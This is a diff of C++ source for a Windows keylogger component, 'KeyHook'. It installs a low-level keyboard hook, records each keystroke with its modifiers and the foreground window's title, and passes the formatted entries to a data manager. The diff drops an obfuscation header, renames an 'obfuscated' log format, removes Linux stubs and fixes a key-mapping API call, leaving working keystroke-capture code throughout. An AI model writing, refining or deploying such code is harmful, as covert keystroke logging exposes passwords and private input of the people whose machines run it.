@@ -3,35 +3,27 @@
 #include "core/Logger.h"
 #include "utils/TimeUtils.h"
 #include "utils/StringUtils.h"
-#include "security/Obfuscation.h"
 
 #include <string>
 #include <sstream>
 #include <cstdint>
 #include <map>
 
-#define OBF_KEYHOOK_MODULE "KeyHook"
-#define OBFUSCATED_KEYLOG_FORMAT "KeyEvent: { action: %s, key: %s, modifiers: %s, window: '%s' }"
+#define KEYLOG_FORMAT "KeyEvent: { action: %s, key: %s, modifiers: %s, window: '%s' }"
 
 // Static member initialization
-#if PLATFORM_WINDOWS
 HHOOK KeyHook::s_keyboardHook = nullptr;
 KeyHook* KeyHook::s_instance = nullptr;
-#endif
 
 KeyHook::KeyHook(DataManager* dataManager) 
     : m_dataManager(dataManager), m_isActive(false) {
-    #if PLATFORM_WINDOWS
     s_instance = this;
-    #endif
-    LOG_INFO("KeyHook initialized for " + std::string(PLATFORM_WINDOWS ? "Windows" : "Linux"));
+    LOG_INFO("KeyHook initialized for Windows");
 }
 
 KeyHook::~KeyHook() {
     RemoveHook();
-    #if PLATFORM_WINDOWS
     s_instance = nullptr;
-    #endif
 }
 
 bool KeyHook::InstallHook() {
@@ -39,7 +31,6 @@ bool KeyHook::InstallHook() {
         return true;
     }
 
-    #if PLATFORM_WINDOWS
     // Set low-level keyboard hook for Windows
     s_keyboardHook = SetWindowsHookExW(
         WH_KEYBOARD_LL,
@@ -53,10 +44,6 @@ bool KeyHook::InstallHook() {
         LOG_ERROR("Failed to install keyboard hook. Error: " + std::to_string(error));
         return false;
     }
-    #elif PLATFORM_LINUX
-    // Linux key logging requires different approach (X11 or evdev)
-    // This is a placeholder - actual implementation would need X11 or libevdev
-    #endif
 
     m_isActive = true;
     LOG_INFO("Keyboard hook installed successfully");
@@ -66,7 +53,6 @@ bool KeyHook::InstallHook() {
 bool KeyHook::RemoveHook() {
     if (!m_isActive) return true;
 
-    #if PLATFORM_WINDOWS
     if (s_keyboardHook && !UnhookWindowsHookEx(s_keyboardHook)) {
         DWORD error = GetLastError();
         LOG_ERROR("Failed to remove keyboard hook. Error: " + std::to_string(error));
@@ -74,16 +60,11 @@ bool KeyHook::RemoveHook() {
     }
 
     s_keyboardHook = nullptr;
-    #elif PLATFORM_LINUX
-    // Clean up Linux key logging resources
-    #endif
-
     m_isActive = false;
     LOG_INFO("Keyboard hook removed successfully");
     return true;
 }
 
-#if PLATFORM_WINDOWS
 LRESULT CALLBACK KeyHook::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= HC_ACTION && s_instance) {
         KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
@@ -191,9 +172,9 @@ std::string KeyHook::PlatformKeyCodeToString(UINT vkCode) const {
         return "Num" + std::to_string(vkCode - VK_NUMPAD0);
     }
 
-    // Convert using MapPlatformKey for other keys
+    // Convert using MapVirtualKey for other keys
     char keyName[256] = {0};
-    UINT scanCode = MapPlatformKeyA(vkCode, MAPVK_VK_TO_VSC);
+    UINT scanCode = MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);
     LONG lParam = (scanCode << 16);
     
     if (GetKeyNameTextA(lParam, keyName, sizeof(keyName))) {
@@ -205,7 +186,6 @@ std::string KeyHook::PlatformKeyCodeToString(UINT vkCode) const {
 
     return "VK_" + std::to_string(vkCode);
 }
-#endif
 
 void KeyHook::LogKeyEvent(const KeyData& keyData) {
     std::string action = (keyData.eventType == KeyEventType::KEY_DOWN) ? "DOWN" : "UP";
@@ -226,7 +206,7 @@ void KeyHook::LogKeyEvent(const KeyData& keyData) {
     }
 
     char logMessage[512];
-    snprintf(logMessage, sizeof(logMessage), OBFUSCATED_KEYLOG_FORMAT,
+    snprintf(logMessage, sizeof(logMessage), KEYLOG_FORMAT,
              action.c_str(), keyData.keyName.c_str(),
              modifiers.c_str(), keyData.windowTitle.c_str());
 
